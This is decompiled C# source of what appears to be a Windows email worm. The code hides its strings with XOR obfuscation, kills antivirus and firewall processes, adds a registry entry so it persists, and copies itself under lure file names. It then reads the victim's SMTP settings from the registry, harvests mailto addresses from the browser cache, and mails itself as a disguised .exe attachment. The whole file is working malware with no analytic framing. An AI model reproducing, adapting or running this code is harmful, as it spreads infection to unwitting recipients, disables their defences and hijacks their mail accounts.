using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace drunkenpope;

public class brigada8
{
	public static void Main(string[] args)
	{
		//IL_0286: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string hhh = "xmlgcncpo.udklft10.t`4.ug`qaclz.tqqvcv.tqjukl10.tqgamop.tqacl62.tgvvpc{.tgv;7.vfq0/lv.vfq0/;:.vac.v`qacl.quggr;7.qrjklz.qoa.qgpt;7.qapqacl.qaclro.qacl;7.qacl10.qcdgug`.pgqawg.pct5ukl.pct5.rgpqdu.raducnnkaml.raaukl;:.rctu.rctqajgf.rctan.rcfokl.mwvrmqv.lta;7.lwrepcfg.lmpokqv.lockl.lkqwo.lctulv.lctu10.lctlv.lctnw10.lctcru10.l10qaclu.ordvpc{.ommnktg.nwcnn.nmmimwv.nmaifmul0222.hgfk.kmoml;:.kdcag.kaqwrrlv.kaqwrr;7.kaoml.kanmcflv.kanmcf;7.k`octqr.k`ocql.kcoqgpt.kcocrr.dpu.drpmv.dr/ukl.dklftkpw.d/qvmru.d/rpmv;7.d/rpmv.d/celv;7.gqrucvaj.gqcdg.gagleklg";
			string text = modem(hhh);
			string hhh2 = "ftr;7]2.ftr;7.angclgp1.angclgp.ancu;7ad.ancu;7.adklgv10.adklgv.adkcwfkv.adkcfokl.`ncaikag.`ncaif.ctuwrf10.ctukl;7.ctqajgf10.ctrwrf.ctrva10.ctro.ctrfmq10.ctraa.ctr10.ctr.ctlv.ctiqgpt.cteavpn.ctg10.ctamlqmn.cwvmfmul.crtzfukl.clvk/vpmhcl.caiukl10.]ctro.]ctraa.]ctr10";
			string text2 = modem(hhh2);
			string[] array = text.Split(new char[1] { ',' });
			string[] array2 = text2.Split(new char[1] { ',' });
			string[] array3 = array;
			foreach (string vry in array3)
			{
				kernelhalt(vry);
			}
			array3 = array2;
			foreach (string vry2 in array3)
			{
				kernelhalt(vry2);
			}
			Module module = Assembly.GetExecutingAssembly().GetModules()[0];
			string akt = xmlparse234(module.FullyQualifiedName);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(modem("Qmdvucpg^Icxcc^NmacnAmlvglv"), writable: true);
			registryKey.SetValue(modem("Fkp2"), modem("2301678") + Directory.GetCurrentDirectory());
			string[] array4 = new string[4]
			{
				modem("Tkqwcn]Qvwfkm,LGV0221]ig{,gzg"),
				modem("vgcaj]{mwpqgnd]a!]kl]3]uggi,gzg"),
				modem("jkvocl0,gzg"),
				modem("Vgiigl6]dwnn,gzg")
			};
			array3 = array4;
			foreach (string destFileName in array3)
			{
				try
				{
					File.Copy(module.FullyQualifiedName, destFileName);
				}
				catch
				{
				}
			}
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(modem("Qmdvucpg^Okapmqmdv^Klvgplgv\"Caamwlv\"Oclcegp"), writable: true);
			RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey(modem("Qmdvucpg^Okapmqmdv^Klvgplgv\"Caamwlv\"Oclcegp^Caamwlvq^") + registryKey2.GetValue(modem("Fgdcwnv\"Ockn\"Caamwlv"))!.ToString(), writable: true);
			string m = registryKey3.GetValue(modem("QOVR\"Qgptgp"))!.ToString();
			string foam = registryKey3.GetValue(modem("QOVR\"Gockn\"Cffpgqq"))!.ToString();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache);
			string[] directories = Directory.GetDirectories(folderPath);
			array3 = directories;
			foreach (string path in array3)
			{
				string[] directories2 = Directory.GetDirectories(path);
				string[] array5 = directories2;
				foreach (string path2 in array5)
				{
					string[] files = Directory.GetFiles(path2, modem("(,jv("));
					string[] array6 = files;
					foreach (string f in array6)
					{
						melee(f, m, foam, akt);
					}
				}
			}
			MessageBox.Show(modem("lm\"ompg\"`gvc\"vumq"), modem("oqkn,ocqq,`\"*a!n{\"ocfg+\"`{\"cnamrcwn-`pkecfc\"majm"), (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
		catch
		{
		}
	}

	public static void melee(string f91, string m91, string foam, string akt7)
	{
		FileStream stream = new FileStream(f91, FileMode.OpenOrCreate, FileAccess.Read);
		StreamReader streamReader = new StreamReader(stream);
		streamReader.BaseStream.Seek(0L, SeekOrigin.Begin);
		while (streamReader.Peek() > -1)
		{
			string helga = streamReader.ReadLine();
			string text = harvest(helga);
			if (text != "")
			{
				try
				{
					codedom563(m91, foam, text, akt7);
				}
				catch
				{
				}
			}
		}
		streamReader.Close();
	}

	public static string harvest(string helga)
	{
		char[] anyOf = new char[6] { '?', '\'', '"', '>', '<', ' ' };
		checked
		{
			try
			{
				int num = helga.IndexOf(modem("ocknvm8"));
				int num2 = helga.LastIndexOfAny(anyOf);
				char[] array = new char[(uint)unchecked(num2 - num)];
				helga.CopyTo(num, array, 0, unchecked(num2 - num));
				string text = new string(array);
				string text2 = text.Replace(modem("ocknvm8"), "");
				string text3 = text2.Replace("%20", "");
				string text4 = text3.Replace("%40", "@");
				try
				{
					int num3 = text4.IndexOfAny(anyOf);
					char[] array2 = new char[(uint)num3];
					text4.CopyTo(0, array2, 0, num3);
					return new string(array2);
				}
				catch
				{
					return text4;
				}
			}
			catch
			{
				return "";
			}
		}
	}

	public static string xmlparse234(string tukoo)
	{
		FileStream fileStream = new FileStream(tukoo, FileMode.OpenOrCreate, FileAccess.Read);
		BinaryReader binaryReader = new BinaryReader(fileStream);
		binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
		byte[] array = new byte[checked((uint)fileStream.Length)];
		int num = (int)fileStream.Length;
		int num2 = 0;
		while (num > 0)
		{
			int num3 = binaryReader.Read(array, num2, num);
			if (num3 == 0)
			{
				break;
			}
			num2 += num3;
			num -= num3;
		}
		binaryReader.Close();
		StringBuilder stringBuilder = new StringBuilder();
		string text = Convert.ToBase64String(array);
		int length = text.Length;
		char[] array2 = new char[checked((uint)length)];
		text.CopyTo(0, array2, 0, length);
		for (int i = 1; i <= length; i++)
		{
			if (i % 76 == 0)
			{
				stringBuilder.Append($"{array2[i - 1]}\r\n");
			}
			else
			{
				stringBuilder.Append($"{array2[i - 1]}");
			}
		}
		return stringBuilder.ToString();
	}

	public static void kernelhalt(string vry324)
	{
		Process[] processesByName = Process.GetProcessesByName(vry324);
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
		}
	}

	public static string modem(string hhh)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < hhh.Length; i++)
		{
			int num = Convert.ToInt32(hhh[i]);
			int value = num ^ 2;
			stringBuilder.Append(Convert.ToChar(value));
		}
		return stringBuilder.ToString();
	}

	public static void codedom563(string asdf, string cvbn, string hjkl, string tukoo)
	{
		string text = modem("Dpmo8\"") + cvbn + " <" + cvbn + ">\r\n";
		string text2 = modem("Vm8\"") + hjkl + " <" + hjkl + ">\r\n";
		string text3 = modem("Fcvg8\"") + DateTime.Now.ToString() + "\r\n";
		string text4 = modem("Z/Ockngp8\"fmlmvvmwaj") + "\r\n";
		string text5 = modem("Z/Rpkmpkv{8\"1") + "\r\n";
		string text6 = modem("OKOG/Tgpqkml8\"3,2") + "\r\n";
		string text7 = modem("Amlvglv/V{rg8\"ownvkrcpv-okzgf9\"`mwlfcp{? //`q`h 9") + "\r\n\r\n";
		string text8 = modem("Vjkq\"kq\"c\"ownvk/rcpv\"ogqqceg\"kl\"OKOG\"dmpocv,") + "\r\n\r\n";
		string text9 = "----bsbj\r\n";
		string text10 = modem("Amlvglv/V{rg8\"vgzv-jvon9\"ajcpqgv?wq/cqakk") + "\r\n\r\n";
		string text11 = modem(" Rggp/vm/Rggp\",LGV\"Qmdvucpg\"cvvcajgf,\"Pgswkpgq\"vjg\",LGV\"dpcogumpi, ") + "\r\n\r\n";
		string text12 = "----bsbj\r\n";
		string text13 = modem("Amlvglv/V{rg8\"crrnkacvkml-z/oqfmulnmcf9\"lcog? lgvdz3,gzg ") + "\r\n";
		string text14 = modem("Amlvglv/Vpclqdgp/Glamfkle8\"`cqg46") + "\r\n";
		string text15 = modem("Amlvglv/Fkqrmqkvkml8\"cvvcajoglv9\"");
		string text16 = modem("dknglcog? lgvdz3,gzg ") + "\r\n\r\n";
		string text17 = "\r\n\r\n";
		string text18 = "----bsbj--\r\n\r\n.\r\n";
		TcpClient tcpClient = new TcpClient(asdf, 25);
		NetworkStream stream = tcpClient.GetStream();
		StreamReader streamReader = new StreamReader(tcpClient.GetStream());
		streamReader.ReadLine();
		string s = modem("JGNM\"nmacnjmqv") + "\r\n";
		byte[] bytes = Encoding.ASCII.GetBytes(s);
		stream.Write(bytes, 0, bytes.Length);
		streamReader.ReadLine();
		s = modem("OCKN\"DPMO8\"") + "<" + cvbn + ">\r\n";
		bytes = Encoding.ASCII.GetBytes(s);
		stream.Write(bytes, 0, bytes.Length);
		streamReader.ReadLine();
		s = modem("PARV\"VM8\"") + "<" + hjkl + ">\r\n";
		bytes = Encoding.ASCII.GetBytes(s);
		stream.Write(bytes, 0, bytes.Length);
		streamReader.ReadLine();
		s = modem("FCVC") + "\r\n";
		bytes = Encoding.ASCII.GetBytes(s);
		stream.Write(bytes, 0, bytes.Length);
		streamReader.ReadLine();
		string s2 = text + text2 + text3 + text4 + text5;
		bytes = Encoding.ASCII.GetBytes(s2);
		stream.Write(bytes, 0, bytes.Length);
		string s3 = text6 + text7 + text8 + text9 + text10 + text11;
		bytes = Encoding.ASCII.GetBytes(s3);
		stream.Write(bytes, 0, bytes.Length);
		string s4 = text12 + text13 + text14 + text15 + text16 + tukoo + text17 + text18;
		bytes = Encoding.ASCII.GetBytes(s4);
		stream.Write(bytes, 0, bytes.Length);
		streamReader.ReadLine();
		s = modem("SWKV") + "\r\n";
		bytes = Encoding.ASCII.GetBytes(s);
		stream.Write(bytes, 0, bytes.Length);
		streamReader.ReadLine();
		stream.Close();
		streamReader.Close();
		tcpClient.Close();
	}
}
